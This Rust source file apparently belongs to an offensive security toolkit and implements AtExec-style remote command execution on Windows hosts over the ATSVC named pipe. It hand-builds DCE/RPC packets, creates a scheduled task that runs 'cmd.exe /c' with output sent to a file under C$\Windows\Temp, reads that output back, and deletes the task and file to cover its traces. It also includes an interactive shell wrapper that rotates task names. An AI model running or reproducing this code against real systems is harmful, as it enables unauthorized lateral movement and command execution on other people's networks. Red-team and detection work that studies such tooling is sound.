//! AtExec-style remote execution via Scheduled Tasks (ATSVC).
//!
//! Uses the MS-TSCH (Task Scheduler) protocol over SMB named pipes.
//! Creates a scheduled task that executes a command, reads output,
//! then deletes the task. Works from Linux/macOS/Windows.
//!
//! Named pipe: `\pipe\atsvc`
//! Interface UUID: 1D9F47C0-6A8F-11D0-8C39-00C04FD9DC61 v1.0

use crate::error::{OverthroneError, Result};
use crate::proto::smb::SmbSession;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
//  DCE/RPC Constants for ATSVC (Task Scheduler)
// ═══════════════════════════════════════════════════════════

const ATSVC_PIPE: &str = "atsvc";

/// ATSVC interface UUID: 1D9F47C0-6A8F-11D0-8C39-00C04FD9DC61
const ATSVC_UUID: [u8; 16] = [
    0xC0, 0x47, 0x9F, 0x1D, 0x8F, 0x6A, 0xD0, 0x11,
    0x8C, 0x39, 0x00, 0xC0, 0x4F, 0xD9, 0xDC, 0x61,
];
const ATSVC_VERSION: [u8; 4] = [0x01, 0x00, 0x00, 0x00]; // v1.0

/// NDR transfer syntax UUID
const NDR_UUID: [u8; 16] = [
    0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11,
    0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
];
const NDR_VERSION: [u8; 4] = [0x02, 0x00, 0x00, 0x00];

/// DCE/RPC packet types
const DCERPC_BIND: u8 = 11;
const DCERPC_REQUEST: u8 = 0;

/// ATSVC operation numbers (opnums)
/// See: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/
const OP_NETR_JOB_ADD: u16 = 0;
const OP_NETR_JOB_DEL: u16 = 2;
#[allow(dead_code)] // Protocol reference opcode
const OP_NETR_JOB_ENUM: u16 = 1;
#[allow(dead_code)] // Protocol reference opcode
const OP_NETR_JOB_GET_INFO: u16 = 3;

/// Task trigger type: On demand (manual)
#[allow(dead_code)] // Kept for protocol completeness
const TASK_TRIGGER_ON_DEMAND: u16 = 7;
/// Task action type: Command line
#[allow(dead_code)] // Kept for protocol completeness
const TASK_ACTION_EXEC: u16 = 0;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Configuration for AtExec
pub struct AtExecConfig {
    /// Task name prefix
    pub task_name: String,
    /// Share for output file (default: "C$")
    pub output_share: String,
    /// Path within share for output file
    pub output_path: String,
    /// Whether to cleanup task and output after execution
    pub cleanup: bool,
    /// Seconds to wait for task completion
    pub timeout_secs: u64,
}

impl Default for AtExecConfig {
    fn default() -> Self {
        let id = rand::random::<u16>();
        AtExecConfig {
            task_name: format!("OvTsk{:04X}", id),
            output_share: "C$".to_string(),
            output_path: format!("Windows\\Temp\\__atexec_{:04X}.tmp", id),
            cleanup: true,
            timeout_secs: 30,
        }
    }
}

/// Result of an AtExec command
#[derive(Debug)]
pub struct AtExecResult {
    pub target: String,
    pub command: String,
    pub task_name: String,
    pub success: bool,
    pub output: String,
    pub job_id: Option<u32>,
}

// ═══════════════════════════════════════════════════════════
//  DCE/RPC Packet Builders
// ═══════════════════════════════════════════════════════════

/// Build a DCE/RPC bind request for ATSVC
fn build_bind_packet() -> Vec<u8> {
    let mut pkt = Vec::with_capacity(72);

    // Header
    pkt.push(5);                        // version
    pkt.push(0);                        // minor version
    pkt.push(DCERPC_BIND);              // packet type
    pkt.push(0x03);                     // flags: first + last frag
    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data representation (LE)
    pkt.extend_from_slice(&[0x00, 0x00]); // frag length placeholder
    pkt.extend_from_slice(&[0x00, 0x00]); // auth length
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // call id = 0

    // Bind body
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max xmit frag
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max recv frag
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // assoc group

    // Context list: 1 item
    pkt.extend_from_slice(&1u32.to_le_bytes()); // num ctx items

    // Context item 0
    pkt.extend_from_slice(&0u16.to_le_bytes()); // context id
    pkt.extend_from_slice(&1u16.to_le_bytes()); // num transfer syntaxes

    // Abstract syntax: ATSVC
    pkt.extend_from_slice(&ATSVC_UUID);
    pkt.extend_from_slice(&ATSVC_VERSION);

    // Transfer syntax: NDR
    pkt.extend_from_slice(&NDR_UUID);
    pkt.extend_from_slice(&NDR_VERSION);

    // Fix frag length
    let len = pkt.len() as u16;
    pkt[8] = (len & 0xFF) as u8;
    pkt[9] = (len >> 8) as u8;

    pkt
}

/// Build a DCE/RPC request packet
fn build_request_packet(opnum: u16, stub: &[u8], call_id: u32) -> Vec<u8> {
    let header_len = 24u16;
    let frag_len = header_len + stub.len() as u16;

    let mut pkt = Vec::with_capacity(frag_len as usize);

    // Header
    pkt.push(5);
    pkt.push(0);
    pkt.push(DCERPC_REQUEST);
    pkt.push(0x03); // first + last
    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data repr
    pkt.extend_from_slice(&frag_len.to_le_bytes());
    pkt.extend_from_slice(&[0x00, 0x00]); // auth length
    pkt.extend_from_slice(&call_id.to_le_bytes());

    // Request body
    let alloc_hint = stub.len() as u32;
    pkt.extend_from_slice(&alloc_hint.to_le_bytes());
    pkt.extend_from_slice(&0u16.to_le_bytes()); // context id
    pkt.extend_from_slice(&opnum.to_le_bytes());

    // Stub data
    pkt.extend_from_slice(stub);

    pkt
}

/// Encode a UTF-16LE string with NDR conformant/varying array header
#[allow(dead_code)] // Protocol helper for NDR encoding
fn ndr_string(s: &str) -> Vec<u8> {
    let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
    let len = wide.len() as u32;

    let mut buf = Vec::new();
    buf.extend_from_slice(&len.to_le_bytes()); // max count
    buf.extend_from_slice(&0u32.to_le_bytes()); // offset
    buf.extend_from_slice(&len.to_le_bytes()); // actual count
    for w in &wide {
        buf.extend_from_slice(&w.to_le_bytes());
    }
    // Pad to 4-byte alignment
    while buf.len() % 4 != 0 {
        buf.push(0);
    }
    buf
}

/// Encode a wide string (no header, just UTF-16LE with null terminator)
fn ndr_wstring(s: &str) -> Vec<u8> {
    let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
    let mut buf = Vec::new();
    for w in &wide {
        buf.extend_from_slice(&w.to_le_bytes());
    }
    // Pad to 4-byte alignment
    while buf.len() % 4 != 0 {
        buf.push(0);
    }
    buf
}

/// Build NetrJobAdd stub (opnum 0)
/// Creates a scheduled task that runs a command
fn build_job_add_stub(server: &str, command: &str, output_path: &str) -> Vec<u8> {
    let mut stub = Vec::new();

    // Server name (pointer + string)
    stub.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent id
    stub.extend_from_slice(&ndr_wstring(server));

    // AT_INFO structure
    // JobTime: when to run (0 = now/asap)
    stub.extend_from_slice(&0u32.to_le_bytes()); // JobTime

    // DaysOfMonth: bitmask for days (0 for one-time)
    stub.extend_from_slice(&0u32.to_le_bytes()); // DaysOfMonth

    // DaysOfWeek: bitmask (0 for one-time)
    stub.extend_from_slice(&0u8.to_le_bytes()); // DaysOfWeek

    // Flags: JOB_NONINTERACTIVE = 0x10
    stub.extend_from_slice(&0x10u8.to_le_bytes()); // Flags

    // Command (the actual command to run)
    // Wrap command to redirect output
    let wrapped_cmd = format!("cmd.exe /c {} > {} 2>&1", command, output_path);
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // referent id
    stub.extend_from_slice(&ndr_wstring(&wrapped_cmd));

    stub
}

/// Build NetrJobDel stub (opnum 2)
/// Deletes a scheduled task by job ID
fn build_job_del_stub(server: &str, job_id: u32) -> Vec<u8> {
    let mut stub = Vec::new();

    // Server name
    stub.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent id
    stub.extend_from_slice(&ndr_wstring(server));

    // Job ID
    stub.extend_from_slice(&job_id.to_le_bytes());

    // MinJobId, MaxJobId (use 0 to delete specific job)
    stub.extend_from_slice(&job_id.to_le_bytes()); // MinJobId
    stub.extend_from_slice(&job_id.to_le_bytes()); // MaxJobId

    stub
}

/// Extract job ID from NetrJobAdd response
fn extract_job_id(response: &[u8]) -> Result<u32> {
    // Response stub starts at offset 24 (after DCE/RPC header)
    let stub_offset = 24;
    if response.len() < stub_offset + 8 {
        return Err(OverthroneError::Smb(
            "ATSVC response too short for job ID extraction".into(),
        ));
    }

    // Job ID is at offset 0 in stub, return code at offset 4
    let job_id = u32::from_le_bytes([
        response[stub_offset],
        response[stub_offset + 1],
        response[stub_offset + 2],
        response[stub_offset + 3],
    ]);

    let rc = u32::from_le_bytes([
        response[stub_offset + 4],
        response[stub_offset + 5],
        response[stub_offset + 6],
        response[stub_offset + 7],
    ]);

    if rc != 0 {
        return Err(OverthroneError::Smb(format!(
            "NetrJobAdd failed with NTSTATUS 0x{:08X}",
            rc
        )));
    }

    Ok(job_id)
}

// ═══════════════════════════════════════════════════════════
//  AtExec Execution
// ═══════════════════════════════════════════════════════════

/// Execute a command on a remote host using Scheduled Tasks.
///
/// Creates an "at" job (scheduled task), waits for execution,
/// reads output, then cleans up.
pub async fn exec_command(
    session: &SmbSession,
    command: &str,
) -> Result<AtExecResult> {
    let config = AtExecConfig::default();
    execute(session, command, &config).await
}

/// Execute with custom configuration
pub async fn execute(
    session: &SmbSession,
    command: &str,
    config: &AtExecConfig,
) -> Result<AtExecResult> {
    info!(
        "AtExec: Executing on {} via scheduled task '{}'",
        session.target, config.task_name
    );
    debug!("AtExec: Command: {}", command);

    let server = format!("\\\\{}", session.target);
    let output_unc = format!("C:\\{}", &config.output_path);

    // Step 1: Bind to ATSVC
    info!("AtExec: Binding to atsvc pipe");
    let bind_pkt = build_bind_packet();
    let bind_resp = session.pipe_transact(ATSVC_PIPE, &bind_pkt).await?;
    debug!("AtExec: Bind response: {} bytes", bind_resp.len());

    // Step 2: NetrJobAdd - create the scheduled task
    info!("AtExec: Creating scheduled task");
    let add_stub = build_job_add_stub(&server, command, &output_unc);
    let add_pkt = build_request_packet(OP_NETR_JOB_ADD, &add_stub, 1);
    let add_resp = session.pipe_transact(ATSVC_PIPE, &add_pkt).await?;
    
    let job_id = extract_job_id(&add_resp)?;
    info!("AtExec: Job ID {} created", job_id);

    // Step 3: Wait for execution
    let output = wait_for_output(session, config, &output_unc).await;

    // Step 4: NetrJobDel - cleanup the job
    if config.cleanup {
        let del_stub = build_job_del_stub(&server, job_id);
        let del_pkt = build_request_packet(OP_NETR_JOB_DEL, &del_stub, 2);
        match session.pipe_transact(ATSVC_PIPE, &del_pkt).await {
            Ok(_) => info!("AtExec: Job {} deleted", job_id),
            Err(e) => warn!("AtExec: Failed to delete job: {e}"),
        }
    }

    // Step 5: Cleanup output file
    if config.cleanup {
        let _ = session.delete_file(&config.output_share, &config.output_path).await;
    }

    Ok(AtExecResult {
        target: session.target.clone(),
        command: command.to_string(),
        task_name: config.task_name.clone(),
        success: !output.is_empty() || job_id > 0,
        output,
        job_id: Some(job_id),
    })
}

/// Wait for output file and read it
async fn wait_for_output(
    session: &SmbSession,
    config: &AtExecConfig,
    _output_unc: &str,
) -> String {
    let poll_interval = std::time::Duration::from_millis(500);
    let max_attempts = (config.timeout_secs * 2) as usize;

    for attempt in 0..max_attempts {
        tokio::time::sleep(poll_interval).await;

        match session.read_file(&config.output_share, &config.output_path).await {
            Ok(data) if !data.is_empty() => {
                debug!(
                    "AtExec: Output ready after {}ms ({} bytes)",
                    (attempt + 1) * 500,
                    data.len()
                );
                return String::from_utf8_lossy(&data).to_string();
            }
            Ok(_) => {
                debug!("AtExec: Output file empty, waiting...");
            }
            Err(_) => {
                if attempt % 4 == 0 {
                    debug!("AtExec: Waiting for output (attempt {})", attempt + 1);
                }
            }
        }
    }

    warn!(
        "AtExec: Timed out after {}s waiting for output",
        config.timeout_secs
    );
    String::new()
}

/// Execute multiple commands sequentially
pub async fn exec_commands(
    session: &SmbSession,
    commands: &[&str],
) -> Vec<AtExecResult> {
    let mut results = Vec::new();

    for cmd in commands {
        match exec_command(session, cmd).await {
            Ok(r) => results.push(r),
            Err(e) => {
                warn!("AtExec: Failed '{}': {e}", cmd);
                results.push(AtExecResult {
                    target: session.target.clone(),
                    command: cmd.to_string(),
                    task_name: String::new(),
                    success: false,
                    output: format!("Error: {e}"),
                    job_id: None,
                });
            }
        }
    }

    results
}

/// Interactive shell wrapper for AtExec
pub struct AtExecShell<'a> {
    session: &'a SmbSession,
    config: AtExecConfig,
    history: Vec<(String, String)>,
}

impl<'a> AtExecShell<'a> {
    pub fn new(session: &'a SmbSession) -> Self {
        AtExecShell {
            session,
            config: AtExecConfig::default(),
            history: Vec::new(),
        }
    }

    pub async fn exec(&mut self, command: &str) -> Result<String> {
        // Rotate task name for each command
        let id = rand::random::<u16>();
        self.config.task_name = format!("OvTsk{:04X}", id);
        self.config.output_path = format!("Windows\\Temp\\__atexec_{:04X}.tmp", id);

        let result = execute(self.session, command, &self.config).await?;
        self.history.push((command.to_string(), result.output.clone()));
        Ok(result.output)
    }

    pub fn history(&self) -> &[(String, String)] {
        &self.history
    }
}

// ═══════════════════════════════════════════════════════════
//  RemoteExecutor Trait Implementation
// ═══════════════════════════════════════════════════════════

use crate::exec::{ExecCredentials, ExecMethod, ExecOutput, RemoteExecutor};

/// AtExec executor that implements RemoteExecutor trait
pub struct AtExecutor {
    creds: ExecCredentials,
}

impl AtExecutor {
    pub fn new(creds: ExecCredentials) -> Self {
        Self { creds }
    }
}

#[async_trait::async_trait]
impl RemoteExecutor for AtExecutor {
    fn method(&self) -> ExecMethod {
        ExecMethod::AtExec
    }

    async fn execute(&self, target: &str, command: &str) -> Result<ExecOutput> {
        let session = SmbSession::connect(
            target,
            &self.creds.domain,
            &self.creds.username,
            &self.creds.password,
        )
        .await?;

        let result = exec_command(&session, command).await?;

        Ok(ExecOutput {
            stdout: result.output,
            stderr: String::new(),
            exit_code: None,
            method: ExecMethod::AtExec,
        })
    }

    async fn check_available(&self, target: &str) -> bool {
        // Check if SMB is available (required for AtExec)
        match SmbSession::connect(
            target,
            &self.creds.domain,
            &self.creds.username,
            &self.creds.password,
        )
        .await
        {
            Ok(session) => {
                // Try to bind to atsvc pipe
                let bind_pkt = build_bind_packet();
                session.pipe_transact(ATSVC_PIPE, &bind_pkt).await.is_ok()
            }
            Err(_) => false,
        }
    }
}

impl Clone for AtExecutor {
    fn clone(&self) -> Self {
        Self {
            creds: self.creds.clone(),
        }
    }
}
